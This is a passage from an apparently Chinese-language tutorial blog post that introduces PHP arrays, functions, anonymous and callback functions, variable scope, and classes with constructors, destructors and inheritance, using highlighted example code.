title="增加数组元素"></a>增加数组元素</h4><ul><li><p>array_push() 函数向第一个参数的数组尾部添加一个或多个元素（入栈），然后返回新数组的长度。</p><p>array_push($array1,’d’,’e’);</p><p>print_r($array1);</p></li><li><p>下表为空 自动添加参数</p><p>$array1[]=’d’;</p></li><li><p>有键值的</p><p>$array1[‘a4’]=’javasciprt’；</p></li></ul><h4 id="添加到指定位置"><a href="#添加到指定位置" class="headerlink" title="添加到指定位置"></a>添加到指定位置</h4><p>array_splice(数组，位置，删除几个，增加元素）</p><h4 id="删除某一个元素"><a href="#删除某一个元素" class="headerlink" title="删除某一个元素"></a>删除某一个元素</h4><p>array_splice(数组，位置，删除一个元素）</p><h4 id="销毁指定的元素"><a href="#销毁指定的元素" class="headerlink" title="销毁指定的元素"></a>销毁指定的元素</h4><p>unset($array1[0]);</p><h4 id="将数组最后一个单元弹出（出栈）"><a href="#将数组最后一个单元弹出（出栈）" class="headerlink" title="将数组最后一个单元弹出（出栈）"></a>将数组最后一个单元弹出（出栈）</h4><p>array_pop():</p><h3 id="常用的数组函数"><a href="#常用的数组函数" class="headerlink" title="常用的数组函数"></a>常用的数组函数</h3><ul><li>is_array 判断是否为数组</li><li>count 数组的元素数目</li><li>array_search — 在数组中搜索给定的值，如果成功则返回相应的键名</li><li>array_key_exists()在给定的 key 存在于数组中时返回 TRUE</li><li>array_unshift()  将传入的单元插入到 array 数组的开头。注意单元是作为整体被插入的，因此传入单元将保持同样的顺序。所有的数值键名将修改为从零开始重新计数，所有的文字键名保持不变</li><li>array_shift()  将array 的第一个单元移出并作为结果返回，将 array 的长度减一并将所有其它单元向前移动一位。所有的数字键名将改为从零开始计数，文字键名将不变。</li><li>array_unique()  接受 array 作为输入并返回没有重复值的新数组。注意键名保留不变。 array_unique()  先将值作为字符串排序，然后对每个值只保留第一个遇到的键名，接着忽略所有后面的键名。这并不意味着在未排序的 array 中同一个值的第一个出现的键名会被保留。 </li><li>in_array — 检查数组中是否存在某个值  如果找到指定的值则返回 TRUE，否则返回 FALSE 。in_array()是区分大小写的。</li></ul><p>下面给出一些实践：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">//声明数组的三种方式</span><span class="token variable">$array1</span><span class="token operator">=</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'a'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'b'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$array2</span><span class="token operator">=</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'a1'</span><span class="token operator">=&gt;</span><span class="token string single-quoted-string">'php'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'a2'</span><span class="token operator">=&gt;</span><span class="token string single-quoted-string">'python'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'a3'</span><span class="token operator">=&gt;</span><span class="token string single-quoted-string">'java'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$array5</span><span class="token operator">=</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'a11'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'b222'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'c333'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token function">print_r</span><span class="token punctuation">(</span><span class="token variable">$array1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;br&gt;'</span><span class="token punctuation">;</span><span class="token function">print_r</span><span class="token punctuation">(</span><span class="token variable">$array2</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;br&gt;'</span><span class="token punctuation">;</span><span class="token function">print_r</span><span class="token punctuation">(</span><span class="token variable">$array5</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;br&gt;'</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$array1</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;br&gt;'</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$array2</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'a2'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2021/07/08/60-zhi-day4/image-20210709142218364.png" alt="image-20210709142218364"></p><p><img src="/2021/07/08/60-zhi-day4/image-20210709142352957.png" alt="image-20210709142352957"></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">//数组长度</span><span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;br&gt;'</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">count</span><span class="token punctuation">(</span><span class="token variable">$array1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;br&gt;'</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">count</span><span class="token punctuation">(</span><span class="token variable">$array2</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//遍历数组</span><span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;br&gt;'</span><span class="token punctuation">;</span><span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$array1</span> <span class="token keyword">as</span> <span class="token variable">$k</span><span class="token operator">=&gt;</span><span class="token variable">$v</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token variable">$k</span><span class="token operator">.</span><span class="token string single-quoted-string">'-----'</span><span class="token operator">.</span><span class="token variable">$v</span><span class="token operator">.</span><span class="token string single-quoted-string">'&lt;br&gt;'</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;br&gt;'</span><span class="token punctuation">;</span><span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$array1</span> <span class="token keyword">as</span> <span class="token variable">$v</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token variable">$v</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;br&gt;'</span><span class="token punctuation">;</span><span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$array2</span> <span class="token keyword">as</span>  <span class="token variable">$k</span><span class="token operator">=&gt;</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token variable">$k</span><span class="token operator">.</span><span class="token string double-quoted-string">"------"</span><span class="token operator">.</span><span class="token variable">$value</span><span class="token operator">.</span><span class="token string single-quoted-string">'&lt;br&gt;'</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;br&gt;'</span><span class="token punctuation">;</span><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token variable">$i</span><span class="token operator">&lt;=</span><span class="token function">count</span><span class="token punctuation">(</span><span class="token variable">$array1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token variable">$array1</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2021/07/08/60-zhi-day4/image-20210709142520629.png" alt="image-20210709142520629"></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">//数组的合并</span><span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;br&gt;'</span><span class="token punctuation">;</span><span class="token variable">$array3</span><span class="token operator">=</span><span class="token function">array_merge</span><span class="token punctuation">(</span><span class="token variable">$array1</span><span class="token punctuation">,</span><span class="token variable">$array2</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">print_r</span><span class="token punctuation">(</span><span class="token variable">$array3</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//数组添加元素</span><span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;br&gt;'</span><span class="token punctuation">;</span><span class="token function">array_push</span><span class="token punctuation">(</span><span class="token variable">$array1</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'d'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'e'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">print_r</span><span class="token punctuation">(</span><span class="token variable">$array1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;br&gt;'</span><span class="token punctuation">;</span><span class="token variable">$array1</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string single-quoted-string">'f'</span><span class="token punctuation">;</span><span class="token function">print_r</span><span class="token punctuation">(</span><span class="token variable">$array1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;br&gt;'</span><span class="token punctuation">;</span><span class="token variable">$array2</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'a4'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string single-quoted-string">'go'</span><span class="token punctuation">;</span><span class="token function">print_r</span><span class="token punctuation">(</span><span class="token variable">$array2</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//更改数组</span><span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;br&gt;'</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;br&gt;'</span><span class="token punctuation">;</span><span class="token variable">$array1</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string single-quoted-string">'x'</span><span class="token punctuation">;</span><span class="token variable">$array2</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'a1'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string single-quoted-string">'php1'</span><span class="token punctuation">;</span><span class="token function">print_r</span><span class="token punctuation">(</span><span class="token variable">$array1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;br&gt;'</span><span class="token punctuation">;</span><span class="token function">print_r</span><span class="token punctuation">(</span><span class="token variable">$array2</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//在指定位置插入</span><span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;br&gt;'</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;br&gt;'</span><span class="token punctuation">;</span><span class="token comment">//array_splice(数组，指定位置3，删除几个元素0，插入元素)</span><span class="token function">array_splice</span><span class="token punctuation">(</span><span class="token variable">$array1</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'g'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">print_r</span><span class="token punctuation">(</span><span class="token variable">$array1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;br&gt;'</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;br&gt;'</span><span class="token punctuation">;</span><span class="token variable">$array4</span><span class="token operator">=</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'1'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'2'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'3'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">array_splice</span><span class="token punctuation">(</span><span class="token variable">$array4</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'4'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">print_r</span><span class="token punctuation">(</span><span class="token variable">$array4</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//销毁指定元素</span><span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;br&gt;'</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;br&gt;'</span><span class="token punctuation">;</span><span class="token keyword">unset</span><span class="token punctuation">(</span><span class="token variable">$array1</span><span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">print_r</span><span class="token punctuation">(</span><span class="token variable">$array1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;br&gt;'</span><span class="token punctuation">;</span><span class="token keyword">unset</span><span class="token punctuation">(</span><span class="token variable">$array2</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'a4'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">print_r</span><span class="token punctuation">(</span><span class="token variable">$array2</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//数组中最后一个元素出栈</span><span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;br&gt;'</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;br&gt;'</span><span class="token punctuation">;</span><span class="token function">array_pop</span><span class="token punctuation">(</span><span class="token variable">$array1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">print_r</span><span class="token punctuation">(</span><span class="token variable">$array1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//数组的一些函数</span><span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;br&gt;'</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;br&gt;'</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">array_search</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'php1'</span><span class="token punctuation">,</span><span class="token variable">$array2</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;br&gt;'</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;br&gt;'</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">array_key_exists</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'a1'</span><span class="token punctuation">,</span><span class="token variable">$array2</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//判断给定的key值是否存在</span><span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2021/07/08/60-zhi-day4/image-20210709142555368.png" alt="image-20210709142555368"></p><h2 id="php函数"><a href="#php函数" class="headerlink" title="php函数"></a>php函数</h2><blockquote><p>php真正力量来自于他的函数，它拥有超过1000个内建函数</p></blockquote><p>函数是可以在程序中重复使用的语句块。，页面加载时函数不会立即执行，函数只有在被调用时才会执行。</p><p>我们也可以自定义函数，函数声明以单词’function’开头。</p><blockquote><p>函数名能够以字母或者下划线开头(而非数字)</p><p>函数名对大小写不敏感。</p><p>函数名应该能反应其所执行的任务</p></blockquote><h2 id="php函数参数"><a href="#php函数参数" class="headerlink" title="php函数参数"></a>php函数参数</h2><h4 id="php默认参数值"><a href="#php默认参数值" class="headerlink" title="php默认参数值"></a>php默认参数值</h4><p>如果我们调用没有参数的函数，他会保留默认值</p><h4 id="php函数返回值"><a href="#php函数返回值" class="headerlink" title="php函数返回值"></a>php函数返回值</h4><p>使用’return’是函数返回值</p><h3 id="匿名函数"><a href="#匿名函数" class="headerlink" title="匿名函数"></a>匿名函数</h3><p>匿名函数就是没有名字的函数。</p><p>将一个匿名函数”赋值”给一个变量——此时该变量就代表该匿名函数了！</p><h3 id="回调函数"><a href="#回调函数" class="headerlink" title="回调函数"></a>回调函数</h3><p>回调函数是指调用函数的时候将另一个函数作为参数传递到调用的函数中，而不是传递一个普通的变量作为参数</p><p>使用回调函数是为了可以将一段自己定义的功能传到函数内部使用</p><p>一些例子：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">//无参数的函数</span><span class="token comment">/*function getName(){    return '晓莎K';}echo getName();*/</span><span class="token comment">//有参数的函数</span><span class="token comment">/*function getName($name){//形式参数    return $name;}echo getName("晓莎K");//实际参数*/</span><span class="token comment">//形式参数有默认值</span><span class="token comment">/*function getName($name='hhh'){//形式参数    return $name;}echo getName("晓莎111K");*/</span><span class="token comment">//没有形式参数的匿名函数</span><span class="token comment">/*$callfunction=function (){  return 'KKK';};echo $callfunction();*/</span><span class="token comment">//有参数的匿名函数</span><span class="token comment">/*$callfunction=function ($name){  return $name;}; echo $callfunction('KKKK');*/</span><span class="token comment">//回调函数</span><span class="token keyword">function</span> <span class="token function-definition function">getName</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">return</span> <span class="token variable">$name</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">echo</span> <span class="token function">call_user_func</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'getName'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'xiaoshaK'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="php变量作用域"><a href="#php变量作用域" class="headerlink" title="php变量作用域"></a>php变量作用域</h2><p>变量作用域是指变量能够被引用的那段脚本</p><p>php三种不同的变量作用域：</p><ul><li>local（局部）</li><li>global（全局）</li><li>static（静态）</li></ul><p><strong>函数之外</strong>声明的变量拥有 Global 作用域，只能在<strong>函数以外</strong>进行访问。</p><p><strong>函数内部</strong>声明的变量拥有 LOCAL 作用域，只能在<strong>函数内部</strong>进行访问。</p><blockquote><p>global 关键词用于在函数内访问全局变量。    </p><p>在函数内的变量前使用此关键字</p></blockquote><blockquote><p>PHP 同时在名为 $GLOBALS[变量名] 的数组中存储了所有的全局变量。下标存有变量名。</p><p>这个数组在函数内也可以访问，并能够用于直接更新全局变量。</p></blockquote><blockquote><p>通常，当函数完成/执行后，会删除所有变量。不过，有时我需要不删除某个局部变量。</p><p>要想变量保留，需要在首次声明变量时使用 static 关键词：</p></blockquote><h2 id="类与对象"><a href="#类与对象" class="headerlink" title="类与对象"></a>类与对象</h2><p>php面向对象</p><p>在面向对象程序设计中，对象是一个由信息及对信息进行处理的描述组成的整体，是对现实世界的抽象。</p><p>对象的三个主要特性：</p><ul><li>对象的行为：可以对对象施加那些操作，开灯，关灯就是行为。</li><li>对象的形态：当施加那些方法是对象如何响应，颜色，尺寸，外型。</li><li>对象的表示：对象的表示就相当于身份证，具体区分在相同的行为与状态下有什么不同。</li></ul><h3 id="面向对象内容"><a href="#面向对象内容" class="headerlink" title="面向对象内容"></a>面向对象内容</h3><p><strong>类：</strong></p><p>定义了一件事物的抽象特点。类的定义包含了数据的形式以及对数据的操作。</p><p><strong>对象：</strong></p><p>类的实例</p><p><strong>成员变量 ：</strong></p><p>定义在类内部的变量。该变量的值对外是不可见的，但是可以通过<strong>成员函数访问</strong>，在类被实例化为对象后，该变量即可称为对象的属性。</p><p><strong>成员函数：</strong></p><p>定义在类的内部，用于访问对象的数据</p><p><strong>继承:</strong></p><p>继承性是子类自动共享父类数据结构和方法的机制，这是类之间的一种关系。</p><p>在定义和实现一个类的时候，可以在一个已经存在的类的基础之上来进行，把这个已经存在的类所定义的内容作为自己的内容，并加入若干新的内容。</p><p><strong>多态：</strong></p><p>多态性是指相同的操作或函数、过程可作用于多种类型的对象上并获得不同的结果。</p><p>不同的对象，收到同一消息可以产生不同的结果，这种现象称为多态性。</p><p><strong>封装：</strong></p><p>封装是指将现实世界中存在的某个客体的属性与行为绑定在一起，并放置在一个逻辑单元内。</p><p><strong>重载：</strong></p><p>简单说，就是函数或者方法有同样的名称，但是参数列表不相同的情形，这样的同名不同参数的函数或者方法之间，互相称之为重载函数或者方法。</p><p><strong>构造函数：</strong></p><p>主要用来在创建对象时初始化对象， 即为对象成员变量赋初始值，总与new运算符一起使用在创建对象的语句中。</p><p><strong>析构函数：</strong></p><p>析构函数(destructor) 与构造函数相反，当对象结束其生命周期时（例如对象所在的函数已调用完毕），系统自动执行析构函数。析构函数往往用来做”清理善后” 的工作（例如在建立对象时用new开辟了一片内存空间，应在退出前在析构函数中用delete释放）。</p><blockquote><p>变量 $this代表自身的对象。</p><p>PHP_EOL为换行符。</p><p>销毁 MyDestructableClass</p></blockquote><p>几个例子：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Person</span><span class="token punctuation">{</span>    <span class="token comment">//成员变量</span>    <span class="token keyword">var</span> <span class="token variable">$name</span><span class="token punctuation">;</span>    <span class="token keyword">var</span> <span class="token variable">$age</span><span class="token punctuation">;</span>    <span class="token keyword">var</span> <span class="token variable">$gender</span><span class="token punctuation">;</span>    <span class="token comment">//成员函数</span>    <span class="token keyword">function</span> <span class="token function-definition function">setName</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">name</span><span class="token operator">=</span><span class="token variable">$name</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function-definition function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">name</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token comment">//类的实例化 p1就是一个对象</span><span class="token comment">//$this 表示对象本身</span><span class="token variable">$p1</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Person</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$p1</span><span class="token operator">-&gt;</span><span class="token function">setName</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'晓莎K'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$p1</span><span class="token operator">-&gt;</span><span class="token property">name</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$p1</span><span class="token operator">-&gt;</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2021/07/08/60-zhi-day4/image-20210709203653206.png" alt="image-20210709203653206"></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Person</span><span class="token punctuation">{</span>    <span class="token comment">//成员变量</span>    <span class="token keyword">var</span> <span class="token variable">$name</span><span class="token punctuation">;</span>    <span class="token keyword">var</span> <span class="token variable">$age</span><span class="token punctuation">;</span>    <span class="token keyword">var</span> <span class="token variable">$gender</span><span class="token punctuation">;</span>    <span class="token comment">//构造函数</span>    <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">name</span><span class="token operator">=</span><span class="token variable">$name</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment">//析构函数</span>    <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">name</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token variable">$p1</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Person</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'晓莎K'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2021/07/08/60-zhi-day4/image-20210709203746227.png" alt="image-20210709203746227"></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Person</span><span class="token punctuation">{</span>    <span class="token keyword">var</span> <span class="token variable">$name</span><span class="token punctuation">;</span>    <span class="token keyword">var</span> <span class="token variable">$age</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span><span class="token variable">$age</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">name</span><span class="token operator">=</span><span class="token variable">$name</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">age</span><span class="token operator">=</span><span class="token variable">$age</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function-definition function">getUser</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token string double-quoted-string">"名字是 <span class="token interpolation"><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">name</span></span> 年龄是 <span class="token interpolation"><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">age</span></span> 岁"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token comment">/*$p1 = new Person('晓莎K','18');echo $p1-&gt;getUser();*/</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">P1</span> <span class="token keyword">extends</span> <span class="token class-name">Person</span><span class="token punctuation">{</span>    <span class="token comment">//重写getuser</span>    <span class="token keyword">function</span> <span class="token function-definition function">getUser</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token string double-quoted-string">"名字是 <span class="token interpolation"><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">name</span></span>"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function-definition function">run</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token string double-quoted-string">" <span class="token interpolation"><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">name</span></span> 在跑步"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token variable">$p2</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">P1</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'KK'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'20'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$p2</span><span class="token operator">-&gt;</span><span class="token function">getUser</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$p2</span><span class="token operator">-&gt;</span><span class="token function">run</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" 